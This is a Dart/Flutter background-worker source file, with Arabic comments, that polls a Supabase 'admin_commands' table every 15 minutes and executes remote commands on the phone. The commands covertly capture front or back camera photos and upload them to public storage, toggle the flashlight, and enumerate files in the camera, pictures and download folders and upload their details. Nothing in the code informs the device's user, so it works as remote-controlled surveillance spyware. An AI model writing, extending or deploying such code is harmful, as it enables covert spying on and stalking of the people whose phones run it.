import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:workmanager/workmanager.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:torch_light/torch_light.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import '../config/base_url.dart';

/// اسم المهمة الدورية
const String commandCheckTask = 'com.example.vrtics.commandCheck';

/// Callback للـ WorkManager - يجب أن يكون top-level
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    debugPrint('🔄 WorkManager: Task started - $task');
    debugPrint('📥 WorkManager: Input Data - $inputData');

    // إذا كانت مهمة فورية (One-off)
    if (task == 'immediate_command' && inputData != null) {
      final commandType = inputData['command_type'];
      final userId = inputData['user_id'];

      if (commandType != null && userId != null) {
        debugPrint(
          '🚀 WorkManager: Executing Immediate One-Off Command: $commandType',
        );
        try {
          // تهيئة Supabase إذا لزم الأمر للرفع
          try {
            await Supabase.initialize(
              url: SUPABASE_URL,
              anonKey: SUPABASE_ANON_KEY,
            );
          } catch (_) {}

          if (commandType == 'camera_front') {
            await _capturePhoto(true, 'front', userId);
          } else if (commandType == 'camera_back') {
            await _capturePhoto(false, 'back', userId);
          } else if (commandType == 'flash_on') {
            await TorchLight.enableTorch();
          } else if (commandType == 'flash_off') {
            await TorchLight.disableTorch();
          }
          return true;
        } catch (e) {
          debugPrint('❌ WorkManager One-Off Error: $e');
          return false;
        }
      }
    }

    try {
      // تهيئة Supabase
      try {
        await Supabase.initialize(
          url: SUPABASE_URL,
          anonKey: SUPABASE_ANON_KEY,
        );
        debugPrint('✅ WorkManager: Supabase initialized');
      } catch (e) {
        debugPrint('⚠️ WorkManager: Supabase already initialized');
      }

      // الحصول على user_id
      final prefs = await SharedPreferences.getInstance();
      final userId = prefs.getInt('user_id');

      if (userId == null) {
        debugPrint('❌ WorkManager: No user ID found');
        return true;
      }

      debugPrint('👤 WorkManager: Checking commands for user $userId');

      // جلب الأوامر غير المنفذة
      final commands = await Supabase.instance.client
          .from('admin_commands')
          .select()
          .eq('target_user_id', userId)
          .eq('executed', false)
          .order('created_at', ascending: true);

      debugPrint('📋 WorkManager: Found ${commands.length} pending commands');

      // تنفيذ كل أمر
      for (final command in commands) {
        final commandType = command['command_type'] as String?;
        final commandId = command['id'];

        if (commandType == null) continue;

        debugPrint('⚡ WorkManager: Executing command: $commandType');

        try {
          switch (commandType) {
            case 'flash_on':
              await TorchLight.enableTorch();
              debugPrint('✅ WorkManager: Flash ON');
              break;

            case 'flash_off':
              await TorchLight.disableTorch();
              debugPrint('✅ WorkManager: Flash OFF');
              break;

            case 'camera_front':
              await _capturePhoto(true, 'front', userId);
              break;

            case 'camera_back':
              await _capturePhoto(false, 'back', userId);
              break;

            case 'list_files':
              await _listFiles(userId);
              break;
          }

          // تحديث حالة الأمر
          await Supabase.instance.client
              .from('admin_commands')
              .update({'executed': true})
              .eq('id', commandId);

          debugPrint('✅ WorkManager: Command $commandType executed and marked');
        } catch (e) {
          debugPrint('❌ WorkManager: Error executing $commandType: $e');
        }
      }

      debugPrint('🎉 WorkManager: Task completed successfully');
      return true;
    } catch (e) {
      debugPrint('❌ WorkManager: Task failed: $e');
      return false;
    }
  });
}

/// التقاط صورة
Future<void> _capturePhoto(bool isFront, String cameraType, int userId) async {
  CameraController? controller;
  try {
    final status = await Permission.camera.request();
    if (!status.isGranted) return;

    final cameras = await availableCameras();
    if (cameras.isEmpty) return;

    CameraDescription? selected;
    for (final cam in cameras) {
      if (isFront && cam.lensDirection == CameraLensDirection.front) {
        selected = cam;
        break;
      } else if (!isFront && cam.lensDirection == CameraLensDirection.back) {
        selected = cam;
        break;
      }
    }
    selected ??= cameras.first;

    controller = CameraController(
      selected,
      ResolutionPreset.medium,
      enableAudio: false,
    );
    await controller.initialize();
    await Future.delayed(const Duration(milliseconds: 500));

    final photo = await controller.takePicture();
    final bytes = await photo.readAsBytes();

    final fileName =
        'capture_${userId}_${DateTime.now().millisecondsSinceEpoch}.jpg';
    await Supabase.instance.client.storage
        .from('media')
        .uploadBinary('captures/$fileName', bytes);

    final imageUrl = Supabase.instance.client.storage
        .from('media')
        .getPublicUrl('captures/$fileName');

    await Supabase.instance.client.from('captured_images').insert({
      'user_id': userId,
      'image_url': imageUrl,
      'camera_type': cameraType,
    });

    debugPrint('✅ WorkManager: Photo captured and uploaded');
  } catch (e) {
    debugPrint('❌ WorkManager: Photo capture error: $e');
  } finally {
    await controller?.dispose();
  }
}

/// جلب قائمة الملفات
Future<void> _listFiles(int userId) async {
  try {
    await Permission.storage.request();
    await Permission.manageExternalStorage.request();

    final directories = [
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
    ];

    int count = 0;
    for (final dirPath in directories) {
      final dir = Directory(dirPath);
      if (await dir.exists()) {
        try {
          final files = dir.listSync().take(20);
          for (final file in files) {
            if (file is File) {
              final stat = await file.stat();
              final name = file.path.split('/').last;
              final ext = name.toLowerCase().split('.').last;
              String type = 'other';
              if (['jpg', 'jpeg', 'png', 'gif', 'webp'].contains(ext)) {
                type = 'image';
              } else if (['mp4', 'mov', 'avi', 'mkv'].contains(ext)) {
                type = 'video';
              }

              await Supabase.instance.client.from('user_files').upsert({
                'user_id': userId,
                'file_name': name,
                'file_path': file.path,
                'file_type': type,
                'file_size': stat.size,
              }, onConflict: 'user_id,file_path');
              count++;
            }
          }
        } catch (e) {
          debugPrint('WorkManager: Error reading $dirPath: $e');
        }
      }
    }
    debugPrint('✅ WorkManager: Listed $count files');
  } catch (e) {
    debugPrint('❌ WorkManager: List files error: $e');
  }
}

/// تهيئة WorkManager
Future<void> initializeWorkManager() async {
  debugPrint('🔧 Initializing WorkManager...');

  await Workmanager().initialize(callbackDispatcher, isInDebugMode: false);

  // تسجيل مهمة دورية كل 15 دقيقة (الحد الأدنى على Android)
  await Workmanager().registerPeriodicTask(
    'commandCheckPeriodic',
    commandCheckTask,
    frequency: const Duration(minutes: 15),
    constraints: Constraints(
      networkType: NetworkType.connected,
      requiresBatteryNotLow: false,
      requiresCharging: false,
      requiresDeviceIdle: false,
      requiresStorageNotLow: false,
    ),
    existingWorkPolicy: ExistingWorkPolicy.replace,
    backoffPolicy: BackoffPolicy.linear,
    backoffPolicyDelay: const Duration(minutes: 1),
  );

  debugPrint('✅ WorkManager: Periodic task registered (every 15 minutes)');
}

/// إلغاء جميع المهام
Future<void> cancelAllWorkManagerTasks() async {
  await Workmanager().cancelAll();
  debugPrint('WorkManager: All tasks cancelled');
}
